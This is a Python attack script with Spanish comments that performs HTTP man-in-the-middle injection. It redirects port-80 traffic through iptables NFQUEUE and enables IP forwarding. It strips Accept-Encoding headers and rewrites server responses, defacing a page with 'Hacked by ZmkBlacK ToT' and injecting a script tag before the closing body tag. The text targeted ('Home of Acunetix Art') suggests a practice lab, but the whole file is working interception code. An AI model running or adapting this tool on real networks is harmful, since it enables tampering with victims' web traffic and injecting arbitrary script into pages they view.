#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import re
import os
import sys
import signal
import time

IPTABLES_RULES = [
    "iptables -I FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 0",
    "iptables -I OUTPUT -p tcp --dport 80 -j NFQUEUE --queue-num 0",
    "iptables -I INPUT -p tcp --sport 80 -j NFQUEUE --queue-num 0"
]

def def_handler(sig, frame):
    print(f"\n[!] Ctrl+C detectado. Restaurando reglas de iptables. Por favor, espera...")
    restore_iptables()
    print(f"[+] Reglas de iptables restauradas. Saliendo.")
    sys.exit(0)

signal.signal(signal.SIGINT, def_handler)

def set_iptables():
    print("[+] Aplicando reglas de iptables para redirigir el tráfico HTTP...")
    for rule in IPTABLES_RULES:
        try:
            os.system(rule)
            print(f"    [+] Regla aplicada: {rule}")
        except Exception as e:
            print(f"    [!] Error al aplicar regla {rule}: {e}. Asegúrate de ejecutar como root.")
            restore_iptables()
            sys.exit(1)
    
    os.system("sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
    print("[+] IP Forwarding habilitado (si no lo estaba).")
    print("[+] Reglas de iptables aplicadas correctamente.")

def restore_iptables():
    print("[+] Restaurando reglas de iptables...")
    for rule in reversed(IPTABLES_RULES):
        delete_rule = rule.replace("-I", "-D")
        try:
            os.system(delete_rule)
            print(f"    [+] Regla eliminada: {delete_rule}")
        except Exception as e:
            print(f"    [!] Error al eliminar regla {delete_rule}: {e}")
    print("[+] Reglas de iptables restauradas.")

def set_load(packet, load):
    packet[scapy.Raw].load = load

    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.TCP) and scapy_packet.haslayer(scapy.Raw):
        try:
            if scapy_packet[scapy.TCP].dport == 80:
                modified_load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", scapy_packet[scapy.Raw].load, flags=re.S)
                new_packet = set_load(scapy_packet, modified_load)
                packet.set_payload(new_packet.build())

            elif scapy_packet[scapy.TCP].sport == 80:
                html_injection_script = b"<script>alert('Hacked by ZmkBlacK ToT');</script>"
                modified_load = scapy_packet[scapy.Raw].load.replace(b"Home of Acunetix Art", b"Hacked by ZmkBlacK ToT")
                
                body_end_tag = b"</body>"
                if body_end_tag in modified_load:
                    modified_load = modified_load.replace(body_end_tag, html_injection_script + body_end_tag)
                    print(f"[+] Inyectado script en respuesta de {scapy_packet[scapy.IP].src}.")

                new_packet = set_load(scapy_packet, modified_load)
                packet.set_payload(new_packet.build())

        except Exception as e:
            pass
    
    packet.accept()

if __name__ == '__main__':
    print("[+] Iniciando HTTP Spoofing.")
    set_iptables()

    print("[+] Escuchando en la cola de NetfilterQueue (ID 0) para tráfico HTTP...")
    print("[+] Presiona Ctrl+C para detener y restaurar las reglas de iptables.")
    
    queue = netfilterqueue.NetfilterQueue()
    try:
        queue.bind(0, process_packet)
        queue.run()
    except PermissionError:
        print("[!] Error de permisos. Necesitas ejecutar el script como root (sudo).")
        restore_iptables()
    except Exception as e:
        print(f"[!] Ocurrió un error inesperado en el HTTP Spoofing: {e}")
    finally:
        queue.unbind()
        restore_iptables()